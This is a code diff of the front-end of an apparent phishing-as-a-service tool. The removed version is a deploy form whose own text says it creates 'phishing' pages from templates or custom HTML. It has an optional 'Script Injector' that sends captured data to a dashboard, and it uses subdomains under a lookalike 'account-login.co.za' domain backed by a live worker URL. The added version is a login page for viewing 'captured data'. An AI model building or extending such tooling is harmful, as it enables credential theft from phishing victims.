@@ -4,131 +4,166 @@
     <meta name="monetag" content="11fda623f808704a24728b96c85545b8">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Hosting Deployment</title>
+    <title>D-TECH CLOUD | Secure Login</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 600px; }
-        h1 { text-align: center; color: #0070f3; margin-top: 0; }
-        p.subtitle { text-align: center; color: #666; margin-bottom: 30px; }
-        .form-group { margin-bottom: 25px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
-        input[type="text"], select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }
-        input:focus, select:focus, textarea:focus { border-color: #0070f3; outline: none; }
+        :root {
+            --bg-color: #050505;
+            --card-bg: #111111;
+            --text-color: #ffffff;
+            --accent-color: #0070f3;
+            --border-color: #222;
+        }
 
-        button.btn-primary { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }
-        button.btn-primary:hover { background: #005bb5; }
-        button.btn-secondary { background: #666; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 13px; margin-top: 5px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-        .footer { text-align: center; margin-top: 30px; font-size: 14px; color: #888; border-top: 1px solid #eee; padding-top: 20px; }
-        .footer a { color: #0070f3; text-decoration: none; font-weight: bold; }
+        .container {
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            animation: fadeIn 0.5s ease-out;
+        }
 
-        #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
+        h1 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+            font-size: 2rem;
+            letter-spacing: -0.5px;
+        }
 
-        .hidden { display: none; }
-        .mode-switch { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-btn { flex: 1; background: #f4f4f4; color: #333; border: 1px solid #ddd; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: bold; text-align: center; }
-        .mode-btn.active { background: #0070f3; color: white; border-color: #0070f3; }
+        p {
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
 
-        .preview-url { font-size: 14px; color: #0070f3; margin-top: 5px; font-family: monospace; }
-        .warning-text { font-size: 13px; color: #d32f2f; margin-top: 5px; line-height: 1.4; background: #ffebee; padding: 10px; border-radius: 4px; border-left: 3px solid #d32f2f; }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
 
-        .input-group { display: flex; gap: 10px; }
-        .input-group input { flex: 1; }
+        input {
+            width: 100%;
+            padding: 14px;
+            background-color: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-sizing: border-box;
+            text-align: center;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+
+        input:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(0, 112, 243, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--accent-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #005bb5;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background-color: #222;
+            color: #ccc;
+            font-size: 14px;
+            padding: 10px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #333;
+            color: white;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .footer a {
+            color: var(--accent-color);
+            text-decoration: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            h1 { font-size: 1.75rem; }
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>🚀 Deploy Your Site</h1>
-        <p class="subtitle">Create a custom phishing page or use a template.</p>
+        <h1>D-TECH CLOUD</h1>
+        <p>Enter your Unique Access Code to manage your deployments and view captured data.</p>
 
-        <div class="mode-switch">
-            <div id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</div>
-            <div id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</div>
+        <div class="input-group">
+            <input type="text" id="uniqueCode" placeholder="Paste Your Unique Code Here" autocomplete="off">
         </div>
 
-        <!-- TEMPLATE MODE -->
-        <div id="section-template" class="form-group">
-            <label>Choose Template</label>
-            <select id="templateName">
-                <option value="">Loading templates...</option>
-            </select>
-        </div>
+        <button onclick="login()" class="btn btn-primary">Access Dashboard</button>
 
-        <!-- CUSTOM MODE -->
-        <div id="section-custom" class="form-group hidden">
-            <label>Upload HTML File</label>
-            <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">
+        <div style="margin: 15px 0; border-bottom: 1px solid #222;"></div>
 
-            <label>Or Paste HTML Code</label>
-            <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 150px;"></textarea>
-
-            <div style="margin-top: 15px; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #eee;">
-                <label style="display:flex; align-items:center; cursor:pointer; margin-bottom: 0;">
-                    <input type="checkbox" id="enableInjector" style="width:auto; margin-right: 10px;">
-                    <span style="font-weight:bold;">Enable Script Injector</span>
-                </label>
-                <small style="color:#666; display:block; margin-top:5px; line-height: 1.4;">
-                    <strong>ON:</strong> Injects capture script. Data is sent to your dashboard.<br>
-                    <strong>OFF:</strong> Hosts static HTML only. No data capture.
-                </small>
-            </div>
-        </div>
-
-        <!-- SUBDOMAIN -->
-        <div class="form-group">
-            <label>Subdomain Name</label>
-            <input type="text" id="subdomain" placeholder="e.g., login-secure" oninput="updatePreview()">
-            <div id="url-preview" class="preview-url"></div>
-        </div>
-
-        <!-- UNIQUE CODE -->
-        <div class="form-group">
-            <label>Unique Secret Code (Master Key)</label>
-            <div class="input-group">
-                <input type="text" id="uniqueCode" placeholder="Enter a strong code...">
-                <button type="button" class="btn-secondary" onclick="generateCode()">Generate</button>
-            </div>
-            <div class="warning-text">
-                <strong>⚠️ IMPORTANT:</strong> This code is your ONLY way to access captured data and manage your sites.
-                If anyone guesses it, they can see your data. Make it hard to guess!
-            </div>
-        </div>
-
-        <button onclick="deploy()" class="btn-primary">Deploy Now</button>
-
-        <div id="message"></div>
+        <p style="margin-bottom: 10px; font-size: 13px;">New user? Generate a secure key.</p>
+        <button onclick="generateCode()" class="btn btn-secondary">Generate New Key</button>
 
         <div class="footer">
-            Already deployed? <a href="dashboard.html">Login to Dashboard</a>
+            &copy; 2024 D-TECH Global | <a href="admin-login.html">Admin</a>
         </div>
     </div>
 
     <script>
-        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
-        const ROOT_DOMAIN = 'account-login.co.za';
-        let currentMode = 'template';
-
-        function setMode(mode) {
-            currentMode = mode;
-            // Toggle Buttons
-            document.getElementById('btn-mode-template').classList.toggle('active', mode === 'template');
-            document.getElementById('btn-mode-custom').classList.toggle('active', mode === 'custom');
-
-            // Toggle Sections
-            document.getElementById('section-template').classList.toggle('hidden', mode !== 'template');
-            document.getElementById('section-custom').classList.toggle('hidden', mode !== 'custom');
-        }
-
-        function updatePreview() {
-            const sub = document.getElementById('subdomain').value.trim();
-            const preview = document.getElementById('url-preview');
-            if (sub) {
-                preview.textContent = `Preview: https://${sub}.${ROOT_DOMAIN}`;
-            } else {
-                preview.textContent = '';
-            }
+        // Check if already logged in
+        if (localStorage.getItem('user_code')) {
+            window.location.href = 'dashboard.html';
         }
 
         function generateCode() {
@@ -141,117 +176,16 @@
             document.getElementById('uniqueCode').value = str;
         }
 
-        function loadFile(input, targetId) {
-            const file = input.files[0];
-            if (!file) return;
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                document.getElementById(targetId).value = e.target.result;
-            };
-            reader.readAsText(file);
-        }
-
-        async function loadTemplates() {
-            const select = document.getElementById('templateName');
-            try {
-                const res = await fetch(`${WORKER_URL}/api/public/templates`);
-                const data = await res.json();
-
-                if (data.success) {
-                    select.innerHTML = '';
-                    const defaultOpt = document.createElement('option');
-                    defaultOpt.value = "";
-                    defaultOpt.textContent = "-- Select a Template --";
-                    select.appendChild(defaultOpt);
-
-                    data.data.forEach(t => {
-                        const opt = document.createElement('option');
-                        opt.value = t;
-                        opt.textContent = t;
-                        select.appendChild(opt);
-                    });
-                } else {
-                     select.innerHTML = '';
-                     const errOpt = document.createElement('option');
-                     errOpt.textContent = "Error loading templates";
-                     select.appendChild(errOpt);
-                }
-            } catch (e) {
-                console.error(e);
-                select.innerHTML = '';
-                const errOpt = document.createElement('option');
-                errOpt.textContent = "Network Error";
-                select.appendChild(errOpt);
-            }
-        }
-
-        async function deploy() {
-            const subdomain = document.getElementById('subdomain').value.trim();
-            const uniqueCode = document.getElementById('uniqueCode').value.trim();
-            const btn = document.querySelector('button[onclick="deploy()"]');
-            const msgEl = document.getElementById('message');
-
-            if (!subdomain || !uniqueCode) {
-                showMessage('Please fill in Subdomain and Unique Code.', 'error');
+        function login() {
+            const code = document.getElementById('uniqueCode').value.trim();
+            if (!code) {
+                alert('Please enter or generate a code.');
                 return;
             }
-
-            const payload = { subdomain, uniqueCode };
-
-            if (currentMode === 'template') {
-                payload.templateName = document.getElementById('templateName').value;
-                if (!payload.templateName) {
-                    showMessage('Please select a template.', 'error');
-                    return;
-                }
-            } else {
-                payload.customHtml = document.getElementById('customHtml').value;
-                payload.enableInjector = document.getElementById('enableInjector').checked;
-                if (!payload.customHtml) {
-                    showMessage('Please provide HTML content.', 'error');
-                    return;
-                }
-            }
-
-            btn.innerText = 'Deploying...';
-            btn.disabled = true;
-            showMessage('', '');
-
-            try {
-                const res = await fetch(`${WORKER_URL}/api/public/deploy`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
-                });
-                const data = await res.json();
-
-                if (data.success) {
-                    showMessage('Deployment Successful! Redirecting...', 'success');
-                    // Save code for convenience? Maybe not for security.
-                    setTimeout(() => {
-                        window.location.href = data.url;
-                    }, 2000);
-                } else {
-                    showMessage(data.error, 'error');
-                    btn.innerText = 'Deploy Now';
-                    btn.disabled = false;
-                }
-            } catch (e) {
-                showMessage('Network Error: ' + e.message, 'error');
-                btn.innerText = 'Deploy Now';
-                btn.disabled = false;
-            }
+            localStorage.setItem('user_code', code);
+            window.location.href = 'dashboard.html';
         }
-
-        function showMessage(text, type) {
-            const el = document.getElementById('message');
-            el.innerText = text;
-            el.className = type;
-            el.style.display = text ? 'block' : 'none';
-        }
-
-        // Load templates on start
-        loadTemplates();
     </script>
+
 </body>
 </html>
